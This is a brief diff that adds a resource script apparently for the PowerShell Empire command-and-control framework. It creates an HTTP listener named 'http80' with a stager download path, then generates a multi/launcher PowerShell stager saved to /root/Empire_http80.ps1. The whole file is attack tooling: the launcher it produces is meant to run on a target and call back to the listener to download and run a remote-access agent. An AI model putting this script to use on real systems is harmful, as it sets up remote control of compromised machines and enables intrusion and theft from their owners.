@@ -1,0 +1,10 @@
+listeners
+uselistener http
+set StagerURI /download/stager.php
+set Name http80
+execute
+listeners
+usestager multi/launcher
+set Listener http80
+set OutFile /root/Empire_http80.ps1
+execute
